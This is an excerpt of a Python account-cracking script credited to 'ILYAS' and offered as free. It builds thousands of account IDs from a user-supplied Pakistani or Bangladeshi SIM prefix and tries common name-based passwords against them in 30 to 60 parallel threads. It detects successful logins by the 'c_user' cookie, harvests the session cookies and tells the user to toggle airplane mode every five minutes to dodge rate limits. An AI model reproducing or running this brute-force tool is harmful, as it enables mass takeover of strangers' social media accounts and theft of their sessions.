...
logo = """
         ...
         \033[1;37m
         \033[1;37m
         \033[1;37m <========CREATED_BY_Iã€€Lã€€Yã€€Aã€€Sã€€ãƒ„========>
         \033[1;37m      
         \033[1;37m
         \033[1;37m 
...
--------------------------------------------------
[â€¢] AUTHOR     : \033[1;32mILYAS\033[1;37m
[â€¢] STATUS     : \033[1;32mFREE\033[1;37m
[â€¢] CONTACT  : 03427941197
--------------------------------------------------
[â€¢] \033[1;37mVERSION    :\033[1;32m 1.0.3 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
--------------------------------------------------"""
...
def svn_digit():
	...
	os.system('clear')
	print(logo)
	print('[â€¢] EXAMPLE :92318,92345,92323,92306.ETC')
	lines()
	kode = input('[â€¢]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[â€¢] MAX LIMIT [5000]')
	lines()
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('[â€¢] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[â€¢] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[â€¢] METHOD YOU CHOOSE : \033[1;32mALI + KHAN')
		print('\x1b[1;97m[â€¢] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
...
def malik_baloch():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('[â€¢] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[â€¢] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[â€¢] METHOD YOU CHOOSE : \033[1;32mMALIK + BALOCH')
		print('\x1b[1;97m[â€¢] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
...
def bd():
	...
	os.system('clear')
	print(logo)
	print('[â€¢] EXAMPLE : 088***,88***,88****,88****,.ETC')
	lines()
	kode = input('[â€¢]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
...
def chos():
    ...
    os.system('clear')
    print(logo)
    print('[â€¢] EXAMPLE : khan12345,bangladish,baloch,Etc')
    lines()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[ILYAS-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mILYAS\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
